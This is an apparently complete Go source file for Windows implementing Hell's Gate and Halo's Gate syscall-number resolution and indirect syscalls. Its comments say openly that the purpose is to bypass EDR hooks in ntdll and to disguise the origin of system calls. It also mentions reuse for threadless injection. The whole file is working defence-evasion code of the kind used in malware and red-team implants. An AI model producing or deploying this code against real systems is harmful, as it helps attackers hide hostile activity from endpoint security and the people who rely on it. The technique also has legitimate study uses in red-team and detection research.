//go:build windows

package winsyscall

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Hell's Gate — dynamic SSN (System Service Number) resolution.
//
// Instead of calling hooked ntdll stubs (which EDRs intercept), we walk the
// PEB at runtime to locate the real ntdll base, parse its export table, and
// read the "mov eax, <ssn>" instruction directly from each syscall stub.
//
// If a stub is hooked (first bytes replaced with a jmp trampoline), we apply
// the Halo's Gate heuristic: scan neighbouring exports (sorted by RVA) whose
// stubs are intact to infer the SSN by index offset.

// ─── PEB / LDR layout ────────────────────────────────────────────────────────

type hgUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	_             uint32
	Buffer        *uint16
}

type hgLdrEntry struct {
	InLoadOrderLinks           [2]uintptr
	InMemoryOrderLinks         [2]uintptr
	InInitializationOrderLinks [2]uintptr
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	_                          uint32
	FullDllName                hgUnicodeString
	BaseDllName                hgUnicodeString
}

// hgNtdllBase returns the base address of ntdll.dll by walking the PEB LDR
// InLoadOrderModuleList — no API calls, no hooks in the path.
func hgNtdllBase() uintptr {
	peb := windows.RtlGetCurrentPeb()
	if peb == nil {
		return 0
	}
	// Ldr is at PEB+0x18; InLoadOrderModuleList.Flink is Ldr+0x10.
	head := uintptr(unsafe.Pointer(peb.Ldr)) + 0x10
	entry := *(*uintptr)(unsafe.Pointer(head))
	for entry != head {
		e := (*hgLdrEntry)(unsafe.Pointer(entry))
		if e.BaseDllName.Buffer != nil {
			name := windows.UTF16PtrToString(e.BaseDllName.Buffer)
			if strings.EqualFold(name, "ntdll.dll") {
				return e.DllBase
			}
		}
		entry = *(*uintptr)(unsafe.Pointer(entry)) // InLoadOrderLinks.Flink
	}
	return 0
}

// ─── PE export table ─────────────────────────────────────────────────────────

// HgExportDir is the PE IMAGE_EXPORT_DIRECTORY layout. Exported so callers
// that parse remote PE exports (e.g. threadless injection) can reuse the type.
type HgExportDir struct {
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32
	Base                  uint32
	NumberOfFunctions     uint32
	NumberOfNames         uint32
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

type hgRVAEntry struct {
	rva  uint32
	name string
}

// hgResolveSSN parses ntdll's export table at base and extracts the SSN for fnName.
func hgResolveSSN(base uintptr, fnName string) (uint16, error) {
	// Validate MZ header
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return 0, fmt.Errorf("hellsgate: invalid MZ at ntdll base 0x%X", base)
	}
	peOff := *(*uint32)(unsafe.Pointer(base + 0x3C))
	// Optional header export RVA is at PE+0x88 (x64 PE optional header offset)
	exportRVA := *(*uint32)(unsafe.Pointer(base + uintptr(peOff) + 0x88))
	if exportRVA == 0 {
		return 0, fmt.Errorf("hellsgate: no export directory in ntdll")
	}

	exp := (*HgExportDir)(unsafe.Pointer(base + uintptr(exportRVA)))
	namesBase := base + uintptr(exp.AddressOfNames)
	funcsBase := base + uintptr(exp.AddressOfFunctions)
	ordsBase := base + uintptr(exp.AddressOfNameOrdinals)

	// Collect all Nt*/Zw* exports with their RVAs for Halo's Gate ordering.
	var syscallExports []hgRVAEntry
	for i := uint32(0); i < exp.NumberOfNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesBase + uintptr(i)*4))
		name := HgCString(base + uintptr(nameRVA))
		if !strings.HasPrefix(name, "Nt") && !strings.HasPrefix(name, "Zw") {
			continue
		}
		ord := *(*uint16)(unsafe.Pointer(ordsBase + uintptr(i)*2))
		fnRVA := *(*uint32)(unsafe.Pointer(funcsBase + uintptr(ord)*4))
		syscallExports = append(syscallExports, hgRVAEntry{fnRVA, name})
	}
	hgSortByRVA(syscallExports)

	for idx, e := range syscallExports {
		if !strings.EqualFold(e.name, fnName) {
			continue
		}
		stub := base + uintptr(e.rva)
		if ssn, ok := hgReadSSN(stub); ok {
			return ssn, nil
		}
		// Halo's Gate: stub hooked — infer SSN from nearest intact neighbour.
		for delta := 1; delta <= 20; delta++ {
			for _, sign := range []int{-1, +1} {
				ni := idx + sign*delta
				if ni < 0 || ni >= len(syscallExports) {
					continue
				}
				ns := base + uintptr(syscallExports[ni].rva)
				if neighbourSSN, ok := hgReadSSN(ns); ok {
					inferred := int(neighbourSSN) - sign*delta
					if inferred >= 0 {
						return uint16(inferred), nil
					}
				}
			}
		}
		return 0, fmt.Errorf("hellsgate: %s is hooked and Halo's Gate recovery failed", fnName)
	}
	return 0, fmt.Errorf("hellsgate: %s not found in ntdll export table", fnName)
}

// hgReadSSN checks whether the stub at addr has the canonical Windows syscall
// prologue and, if so, extracts the 16-bit SSN.
//
//	4C 8B D1        mov r10, rcx
//	B8 xx xx 00 00  mov eax, <ssn>
func hgReadSSN(addr uintptr) (uint16, bool) {
	b := (*[8]byte)(unsafe.Pointer(addr))
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		return *(*uint16)(unsafe.Pointer(addr + 4)), true
	}
	return 0, false
}

// ─── SSN cache ───────────────────────────────────────────────────────────────

var (
	hgCachedBase   uintptr
	hgCachedGadget uintptr            // address of `syscall` instruction inside ntdll
	hgCache        = map[string]uint16{}
)

// hgGetSSN returns the SSN for fnName, resolving and caching on first call.
func hgGetSSN(fnName string) (uint16, error) {
	if ssn, ok := hgCache[fnName]; ok {
		return ssn, nil
	}
	if hgCachedBase == 0 {
		hgCachedBase = hgNtdllBase()
		if hgCachedBase == 0 {
			return 0, fmt.Errorf("hellsgate: cannot locate ntdll base via PEB walk")
		}
	}
	ssn, err := hgResolveSSN(hgCachedBase, fnName)
	if err != nil {
		return 0, err
	}
	hgCache[fnName] = ssn
	return ssn, nil
}

// ─── Indirect syscall gadget ─────────────────────────────────────────────────

// hgFindSyscallGadget scans ntdll's Nt* export stubs for a canonical syscall
// prologue and returns the address of the `syscall` (0F 05) instruction within
// ntdll's .text section. Executing the syscall instruction from ntdll's address
// range ensures the kernel trap frame shows an ntdll return address instead of
// an anonymous heap allocation — the basis of the indirect-syscall technique.
func hgFindSyscallGadget(base uintptr) uintptr {
	if base == 0 {
		return 0
	}
	if *(*uint16)(unsafe.Pointer(base)) != 0x5A4D {
		return 0
	}
	peOff := *(*uint32)(unsafe.Pointer(base + 0x3C))
	exportRVA := *(*uint32)(unsafe.Pointer(base + uintptr(peOff) + 0x88))
	if exportRVA == 0 {
		return 0
	}
	exp := (*HgExportDir)(unsafe.Pointer(base + uintptr(exportRVA)))
	namesBase := base + uintptr(exp.AddressOfNames)
	funcsBase := base + uintptr(exp.AddressOfFunctions)
	ordsBase := base + uintptr(exp.AddressOfNameOrdinals)

	limit := exp.NumberOfNames
	if limit > 512 {
		limit = 512
	}
	for i := uint32(0); i < limit; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(namesBase + uintptr(i)*4))
		name := HgCString(base + uintptr(nameRVA))
		if len(name) < 2 || name[0] != 'N' || name[1] != 't' {
			continue
		}
		ord := *(*uint16)(unsafe.Pointer(ordsBase + uintptr(i)*2))
		fnRVA := *(*uint32)(unsafe.Pointer(funcsBase + uintptr(ord)*4))
		stub := base + uintptr(fnRVA)
		// Require canonical unhoooked prologue: mov r10,rcx (4C 8B D1)
		b := (*[32]byte)(unsafe.Pointer(stub))
		if b[0] != 0x4C || b[1] != 0x8B || b[2] != 0xD1 {
			continue
		}
		// Scan up to 28 bytes for the syscall instruction (0F 05).
		// Handles both the compact 11-byte form and the SharedUserData variant.
		for j := 3; j < 28; j++ {
			if b[j] == 0x0F && b[j+1] == 0x05 {
				return stub + uintptr(j)
			}
		}
	}
	return 0
}

// ─── Executable stub allocation ───────────────────────────────────────────────
//
// Go has no inline asm on amd64, so we allocate a tiny RWX trampoline:
//
//	4C 8B D1              mov r10, rcx       (Windows x64 syscall ABI)
//	B8 lo hi 00 00        mov eax, <ssn>
//	0F 05                 syscall
//	C3                    ret

func hgMakeStub(ssn uint16) (uintptr, func(), error) {
	// Build stub bytes. Use indirect syscall (JMP to ntdll gadget) when available
	// so the syscall instruction executes from ntdll's address range — the kernel
	// trap frame then shows an ntdll return address rather than anonymous heap.
	var stubBytes []byte
	gadget := hgCachedGadget
	if gadget == 0 && hgCachedBase != 0 {
		gadget = hgFindSyscallGadget(hgCachedBase)
		hgCachedGadget = gadget
	}

	if gadget != 0 {
		// Indirect: mov r10,rcx / mov eax,ssn / mov r11,<gadget> / jmp r11
		stubBytes = []byte{
			0x4C, 0x8B, 0xD1,
			0xB8, byte(ssn), byte(ssn >> 8), 0x00, 0x00,
			0x49, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0, // mov r11, imm64 (filled below)
			0x41, 0xFF, 0xE3, // jmp r11
		}
		for i := 0; i < 8; i++ {
			stubBytes[10+i] = byte(gadget >> (uint(i) * 8))
		}
	} else {
		// Fallback: inline syscall (functional but less OPSEC)
		stubBytes = []byte{
			0x4C, 0x8B, 0xD1,
			0xB8, byte(ssn), byte(ssn >> 8), 0x00, 0x00,
			0x0F, 0x05,
			0xC3,
		}
	}

	// W^X: allocate RW, write, then flip to RX before execution.
	mem, err := windows.VirtualAlloc(0, uintptr(len(stubBytes)),
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return 0, nil, fmt.Errorf("hellsgate VirtualAlloc: %w", err)
	}
	copy(unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(stubBytes)), stubBytes)
	var old uint32
	if err := windows.VirtualProtect(mem, uintptr(len(stubBytes)), windows.PAGE_EXECUTE_READ, &old); err != nil {
		windows.VirtualFree(mem, 0, windows.MEM_RELEASE) //nolint:errcheck
		return 0, nil, fmt.Errorf("hellsgate VirtualProtect: %w", err)
	}
	free := func() { windows.VirtualFree(mem, 0, windows.MEM_RELEASE) } //nolint:errcheck
	return mem, free, nil
}

// ─── Public API ──────────────────────────────────────────────────────────────

// HellsGateCall issues a direct NT syscall for fnName, bypassing any hooked
// ntdll stub. args must match the native NT function's parameter list exactly.
//
// Return value is the NTSTATUS code (0 = success).
func HellsGateCall(fnName string, args ...uintptr) (uintptr, error) {
	ssn, err := hgGetSSN(fnName)
	if err != nil {
		return 0, err
	}
	stub, free, err := hgMakeStub(ssn)
	if err != nil {
		return 0, err
	}
	defer free()

	// syscall.SyscallN dispatches through a raw function pointer on amd64;
	// the Go runtime handles the M-parking correctly for blocking syscalls.
	r0, _, errno := syscall.SyscallN(stub, args...)
	if errno != 0 {
		// errno here is the Windows error from GetLastError, not NTSTATUS.
		// NTSTATUS is in r0.
	}
	if r0 != 0 {
		return r0, fmt.Errorf("HellsGateCall(%s): NTSTATUS 0x%08X", fnName, uint32(r0))
	}
	return r0, nil
}

// HellsGateSSN returns only the resolved SSN (for callers that build their own stub).
func HellsGateSSN(fnName string) (uint16, error) {
	return hgGetSSN(fnName)
}

// ─── Utility helpers ─────────────────────────────────────────────────────────

// HgCString reads a null-terminated ASCII string from a memory address.
func HgCString(addr uintptr) string {
	if addr == 0 {
		return ""
	}
	n := 0
	for *(*byte)(unsafe.Pointer(addr + uintptr(n))) != 0 {
		n++
	}
	return string(unsafe.Slice((*byte)(unsafe.Pointer(addr)), n))
}

// hgSortByRVA sorts []hgRVAEntry in ascending RVA order (insertion sort;
// export tables are small enough that O(n²) is fine).
func hgSortByRVA(e []hgRVAEntry) {
	for i := 1; i < len(e); i++ {
		key := e[i]
		j := i - 1
		for j >= 0 && e[j].rva > key.rva {
			e[j+1] = e[j]
			j--
		}
		e[j+1] = key
	}
}
